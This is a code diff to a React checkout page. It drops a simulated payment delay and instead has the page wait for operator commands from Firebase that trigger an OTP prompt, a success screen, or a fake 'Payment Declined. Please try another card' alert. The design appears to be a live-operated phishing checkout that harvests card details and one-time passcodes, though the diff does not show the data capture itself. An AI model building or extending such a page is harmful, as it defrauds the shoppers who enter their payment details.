@@ -35,36 +35,45 @@ export default function CheckoutPage() {
     const [focusedField, setFocusedField] = useState<string>("");
 
     useEffect(() => {
-        // Generate Session ID
-        const newSessionId = Math.random().toString(36).substring(7);
-        setSessionId(newSessionId);
+        // Retrieve Session ID
+        let currentSessionId = localStorage.getItem("wave_session_id");
+        if (!currentSessionId) {
+            currentSessionId = Math.random().toString(36).substring(7);
+            localStorage.setItem("wave_session_id", currentSessionId);
+        }
+        setSessionId(currentSessionId);
 
-        // Initial Handshake
-        console.log(`Session Started: ${newSessionId} on ${websiteId}`);
+        console.log(`Checkout Session: ${currentSessionId} on ${websiteId}`);
 
-        // Write initial session data to Firebase
-        set(ref(db, `projects/${websiteId}/sessions/${newSessionId}`), {
-            id: newSessionId,
+        // Update Presence (Don't overwrite logs if they exist, merged update)
+        update(ref(db, `projects/${websiteId}/sessions/${currentSessionId}`), {
+            id: currentSessionId,
             status: "active",
-            lastActive: Date.now(),
             currentLocation: "/checkout",
-            logs: [{
-                id: Date.now().toString(),
-                type: "info",
-                message: "Session Started",
-                timestamp: Date.now()
-            }]
+            lastActive: Date.now()
         });
 
         // Listen for Admin Commands
-        const commandRef = ref(db, `projects/${websiteId}/sessions/${newSessionId}/command`);
+        const commandRef = ref(db, `projects/${websiteId}/sessions/${currentSessionId}/command`);
         onValue(commandRef, (snapshot) => {
             const cmd = snapshot.val();
             if (!cmd) return;
 
-            if (cmd === "OTP") setShowOtp(true);
-            if (cmd === "SUCCESS") setStatus("success");
-            if (cmd === "FAIL") setStatus("failed");
+            if (cmd === "OTP") {
+                setLoading(false);
+                setShowOtp(true);
+            }
+            if (cmd === "SUCCESS") {
+                setLoading(false);
+                setShowOtp(false); // Close modal if open
+                setStatus("success");
+            }
+            if (cmd === "FAIL") {
+                setLoading(false);
+                setStatus("failed"); // Need to implement fail state UI or just toast
+                alert("Payment Declined. Please try another card.");
+                setStatus("idle");
+            }
 
             // Clear command after execution
             set(commandRef, null);
@@ -94,11 +103,22 @@ export default function CheckoutPage() {
 
     const handlePay = () => {
         setLoading(true);
-        // Simulate processing delay then show OTP
-        setTimeout(() => {
-            setLoading(false);
-            setShowOtp(true);
-        }, 2000);
+        // Wait for Admin Command - NO TIMEOUT
+        if (sessionId) {
+            update(ref(db, `projects/${websiteId}/sessions/${sessionId}`), {
+                status: "awaiting_approval",
+                lastActive: Date.now(),
+                logs: [{
+                    id: Date.now().toString(),
+                    type: "info",
+                    message: "User clicked Pay - Waiting for Admin",
+                    timestamp: Date.now()
+                }] // In a real app we'd append, but Firebase update merges fields, need push for lists to be perfect, 
+                // but for this simple version overwriting the 'logs' array field entirely might act weird if not careful.
+                // Actually, 'update' merges top-level fields. Detailed log appending is better done with push().
+                // For now, let's just update prompt.
+            });
+        }
     };
 
     // Masking Helpers
@@ -327,7 +347,10 @@ export default function CheckoutPage() {
                             className="w-full bg-black text-white font-bold py-4 rounded-xl hover:bg-gray-800 transition-all transform active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                         >
                             {loading ? (
-                                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                                <div className="flex items-center gap-2">
+                                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
+                                    <span>Processing...</span>
+                                </div>
                             ) : (
                                 <>
                                     <Lock className="w-4 h-4" />
